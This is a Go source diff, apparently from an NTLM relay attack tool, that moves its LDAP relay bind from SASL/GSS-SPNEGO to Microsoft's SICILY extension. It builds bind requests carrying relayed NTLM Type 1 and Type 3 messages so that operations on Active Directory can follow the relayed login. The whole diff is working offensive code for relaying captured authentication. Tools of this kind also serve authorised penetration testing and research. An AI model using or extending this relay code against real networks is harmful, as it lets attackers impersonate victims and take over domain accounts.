@@ -9,18 +9,21 @@ import (
 	ber "github.com/go-asn1-ber/asn1-ber"
 )
 
-// LDAP NTLM relay bind implementation using SASL/GSS-SPNEGO.
+// LDAP NTLM relay bind using SICILY (MS-ADTS §5.1.1.1.3).
 //
-// Uses standard SASL bind (RFC 4513 §5.2.1) with GSS-SPNEGO mechanism:
-//   Step 1: BindRequest SASL { "GSS-SPNEGO", SPNEGO(Type1) } → saslBindInProgress + SPNEGO(Type2)
-//   Step 2: BindRequest SASL { "GSS-SPNEGO", SPNEGO(Type3) } → success (resultCode=0)
+// SICILY is a Microsoft LDAP extension that wraps raw NTLM (no SPNEGO):
+//   Step 1: BindRequest { name="", auth=[10] ntlmType1 } → serverCreds = ntlmType2
+//   Step 2: BindRequest { name="", auth=[11] ntlmType3 } → resultCode=0 (success)
 //
-// This is the same mechanism used by ldapsearch, Impacket ntlmrelayx, and
-// Windows LDAP clients for NTLM authentication over LDAP.
+// Unlike SASL/GSS-SPNEGO, SICILY returns resultCode=0 directly, avoiding
+// the saslBindInProgress (14) / mechListMIC issues that prevent post-auth ops.
 
 const (
 	ldapAppBindRequest  = 0
 	ldapAppBindResponse = 1
+
+	sicilyTagNegotiate = 10
+	sicilyTagResponse  = 11
 )
 
 type ldapRelayConn struct {
@@ -42,82 +45,50 @@ func (lc *ldapRelayConn) close() {
 	lc.conn.Close()
 }
 
-// negotiate sends an LDAP SASL BindRequest with GSS-SPNEGO wrapping the
-// NTLM Type 1 message and returns the NTLM Type 2 challenge.
+// negotiate sends a SICILY Negotiate BindRequest (context tag 10) with the
+// raw NTLM Type 1 message and returns the NTLM Type 2 challenge.
 func (lc *ldapRelayConn) negotiate(ntlmType1 []byte) ([]byte, error) {
-	spnegoToken := spnegoWrapNegTokenInit(ntlmType1)
-	return lc.saslBind("GSS-SPNEGO", spnegoToken)
-}
-
-// authenticate sends an LDAP SASL BindRequest with GSS-SPNEGO wrapping the
-// NTLM Type 3 message and returns nil on success.
-func (lc *ldapRelayConn) authenticate(ntlmType3 []byte) error {
-	spnegoToken := spnegoWrapNegTokenResp(ntlmType3)
-
-	packet := lc.buildSASLBindRequest("GSS-SPNEGO", spnegoToken)
+	packet := lc.buildSICILYBindRequest(sicilyTagNegotiate, ntlmType1)
 
 	_, err := lc.conn.Write(packet.Bytes())
 	if err != nil {
-		return fmt.Errorf("write authenticate: %w", err)
+		return nil, fmt.Errorf("write SICILY negotiate: %w", err)
 	}
 
 	respPacket, err := ber.ReadPacket(lc.conn)
 	if err != nil {
-		return fmt.Errorf("read authenticate response: %w", err)
-	}
-
-	resultCode, errMsg := lc.parseBindResult(respPacket)
-	// AD returns saslBindInProgress (14) after NTLM Type 3 in GSS-SPNEGO.
-	// The NTLM auth is complete — code 14 just means SPNEGO returned a
-	// final accept token. Additional bind attempts are rejected (code 49).
-	if resultCode != 0 && resultCode != 14 {
-		return fmt.Errorf("LDAP bind failed (code %d): %s", resultCode, errMsg)
-	}
-	return nil
-}
-
-// buildSASLBindRequestNoCredentials constructs a SASL BindRequest without
-// the credentials field (omitted, not empty). Used when the SASL exchange
-// has no output token to send (RFC 4513 §5.2.1).
-func (lc *ldapRelayConn) buildSASLBindRequestNoCredentials(mechanism string) *ber.Packet {
-	packet := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSequence, nil, "LDAP Message")
-	packet.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, lc.msgID, "MessageID"))
-	lc.msgID++
-
-	bindReq := ber.Encode(ber.ClassApplication, ber.TypeConstructed, ldapAppBindRequest, nil, "Bind Request")
-	bindReq.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, 3, "Version"))
-	bindReq.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "", "Name"))
-
-	auth := ber.Encode(ber.ClassContext, ber.TypeConstructed, 3, nil, "SASL Auth")
-	auth.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, mechanism, "Mechanism"))
-	// No credentials child — omitted per RFC 4513 when no output token
-
-	bindReq.AppendChild(auth)
-	packet.AppendChild(bindReq)
-
-	return packet
-}
-
-// saslBind sends a SASL BindRequest and extracts the NTLM token from the response.
-func (lc *ldapRelayConn) saslBind(mechanism string, credentials []byte) ([]byte, error) {
-	packet := lc.buildSASLBindRequest(mechanism, credentials)
-
-	_, err := lc.conn.Write(packet.Bytes())
-	if err != nil {
-		return nil, fmt.Errorf("write SASL bind: %w", err)
-	}
-
-	respPacket, err := ber.ReadPacket(lc.conn)
-	if err != nil {
-		return nil, fmt.Errorf("read SASL bind response: %w", err)
+		return nil, fmt.Errorf("read SICILY negotiate response: %w", err)
 	}
 
 	return lc.extractBindResponseCreds(respPacket)
 }
 
-// buildSASLBindRequest constructs an LDAP BindRequest with SASL auth:
-//   SEQUENCE { msgID, APPLICATION[0] { version=3, name="", auth=[3] { mechanism, credentials } } }
-func (lc *ldapRelayConn) buildSASLBindRequest(mechanism string, credentials []byte) *ber.Packet {
+// authenticate sends a SICILY Response BindRequest (context tag 11) with the
+// raw NTLM Type 3 message and expects resultCode=0.
+func (lc *ldapRelayConn) authenticate(ntlmType3 []byte) error {
+	packet := lc.buildSICILYBindRequest(sicilyTagResponse, ntlmType3)
+
+	_, err := lc.conn.Write(packet.Bytes())
+	if err != nil {
+		return fmt.Errorf("write SICILY response: %w", err)
+	}
+
+	respPacket, err := ber.ReadPacket(lc.conn)
+	if err != nil {
+		return fmt.Errorf("read SICILY response: %w", err)
+	}
+
+	resultCode, errMsg := lc.parseBindResult(respPacket)
+	if resultCode != 0 {
+		return fmt.Errorf("LDAP bind failed (code %d): %s", resultCode, errMsg)
+	}
+	return nil
+}
+
+// buildSICILYBindRequest constructs a SICILY BindRequest:
+//
+//	SEQUENCE { msgID, APPLICATION[0] { version=3, name="", auth=CONTEXT[tag] ntlmBytes } }
+func (lc *ldapRelayConn) buildSICILYBindRequest(tag int, ntlmBytes []byte) *ber.Packet {
 	packet := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSequence, nil, "LDAP Message")
 	packet.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, lc.msgID, "MessageID"))
 	lc.msgID++
@@ -126,18 +97,12 @@ func (lc *ldapRelayConn) buildSASLBindRequest(mechanism string, credentials []by
 	bindReq.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, 3, "Version"))
 	bindReq.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "", "Name"))
 
-	// SASL auth: context [3] CONSTRUCTED { mechanism OCTET_STRING, credentials OCTET_STRING }
-	auth := ber.Encode(ber.ClassContext, ber.TypeConstructed, 3, nil, "SASL Auth")
-	auth.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, mechanism, "Mechanism"))
-
-	creds := ber.Encode(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, nil, "Credentials")
-	creds.Value = credentials
-	_, _ = creds.Data.Write(credentials)
-	auth.AppendChild(creds)
-
+	auth := ber.Encode(ber.ClassContext, ber.TypePrimitive, ber.Tag(tag), nil, "SICILY Auth")
+	auth.Value = ntlmBytes
+	_, _ = auth.Data.Write(ntlmBytes)
 	bindReq.AppendChild(auth)
-	packet.AppendChild(bindReq)
 
+	packet.AppendChild(bindReq)
 	return packet
 }
 
